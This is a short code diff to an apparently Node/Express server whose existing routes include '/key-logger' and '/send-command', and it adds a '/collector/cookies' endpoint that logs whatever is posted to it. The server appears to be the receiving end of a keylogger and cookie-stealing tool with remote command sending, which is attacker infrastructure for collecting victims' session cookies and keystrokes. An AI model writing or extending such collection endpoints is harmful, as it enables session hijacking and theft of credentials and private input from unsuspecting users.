@@ -58,6 +58,11 @@ app.post('/key-logger', (req, res) => {
     res.status(200)
 });
 
+app.post('/collector/cookies', (req, res) => {
+    console.log(req.body)
+    res.status(200)
+})
+
 app.post('/send-command', (req, res) => {
     if (!req.body.command) {
         res.status(400).send('Bad request')
